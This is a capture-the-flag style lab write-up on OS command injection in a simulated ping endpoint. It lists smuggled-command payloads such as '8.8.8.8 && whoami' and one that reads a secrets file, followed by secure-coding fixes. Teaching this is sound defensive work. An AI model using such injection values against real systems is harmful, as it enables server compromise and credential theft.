# Command Injection Lab — Network Diagnostic Tool

## Lab Overview

This lab demonstrates an **OS Command Injection** vulnerability where user-controlled input is inserted into a system command without proper validation.

The application provides an internal network diagnostic tool that allows employees to ping a host.

Attackers exploit unsafe command execution to run additional operating system commands and retrieve sensitive backend files.

---

## Vulnerability Type

OS Command Injection

OWASP Category:

A03:2021 — Injection

A05:2021 — Security Misconfiguration

---

## Scenario

Employees can test network connectivity using an internal ping utility.

Application endpoint:

POST

```text
/api/cmdi/ping
```

Request body:

```json
{
"host":"8.8.8.8"
}
```

The backend executes a system command using user input.

Example vulnerable behavior:

```text
ping -n 2 user_input
```

The application fails to safely validate or sanitize the `host` parameter.

---

## Normal Usage

Request:

```text
POST
/api/cmdi/ping
```

Body:

```json
{
"host":"8.8.8.8"
}
```

Response:

```text
Pinging 8.8.8.8 with 32 bytes of data:

Reply from 8.8.8.8
Reply from 8.8.8.8
```

---

## Enumeration Clues

A normal ping request returns command output.

The response reveals that the application is executing an operating system command.

Attackers may test command separators such as:

```text
&&
&
|
||
```

On Windows, the `&&` operator can be used to execute another command after the first command succeeds.

Example test:

```text
8.8.8.8 && whoami
```

---

## Exploit Payload

Modify host input:

From:

```text
8.8.8.8
```

To:

```text
8.8.8.8 && whoami
```

Request:

```text
POST
/api/cmdi/ping
```

Body:

```json
{
"host":"8.8.8.8 && whoami"
}
```

This confirms command injection by executing the `whoami` command.

---

## File Discovery

After confirming command injection, enumerate files:

```text
8.8.8.8 && dir
```

The output reveals backend directories:

```text
backups
files
src
transcripts
```

The attacker identifies a sensitive file inside:

```text
files/admin_secret.txt
```

---

## Final Exploit Payload

Read the sensitive file:

```text
8.8.8.8 && type files\admin_secret.txt
```

Request body:

```json
{
"host":"8.8.8.8 && type files\\admin_secret.txt"
}
```

---

## Successful Exploitation

Response contains:

```text
Administrator: root

Backup Password:
Root@2026!

Internal Note:
Rotate credentials monthly.
```

---

## Impact

Attacker gains:

✔ Operating system command execution

✔ Backend file enumeration

✔ Sensitive credential disclosure

✔ Potential full server compromise

Possible consequences:

```text
Credential theft
Privilege escalation
Data leakage
Remote code execution
Server takeover
```

---

## Root Cause

Application directly passes user input into an operating system command.

Example vulnerable logic:

```text
ping -n 2 ${host}
```

without validating or safely handling the `host` value.

This allows attackers to append additional commands.

---

## Secure Fixes

### Avoid Shell Execution

Do not pass user input directly into shell commands.

Use safer APIs that do not invoke a shell.

---

### Validate Input Strictly

Allow only valid IP addresses or domain names.

Reject characters such as:

```text
&
|
;
`
$
>
<
```

---

### Use Allowlists

Only allow expected formats:

```text
8.8.8.8
example.com
internal.local
```

---

### Run With Least Privilege

The application should run with a low-privileged user account.

Even if command injection occurs, attacker impact should be limited.

---

### Hide Sensitive Files

Never store secrets in readable backend files such as:

```text
admin_secret.txt
.env
backup notes
credentials.txt
```

---

## Learning Objectives

After completing this lab learners should understand:

- OS Command Injection vulnerabilities
- Command separators
- Backend command execution risks
- File enumeration through command injection
- Sensitive file disclosure
- Secure command handling

---

## Lab Information

Lab:

Command Injection — Network Diagnostic Tool

Difficulty:

Medium–Hard

Category:

Injection / Server-Side Vulnerabilities

Status:

✔ Completed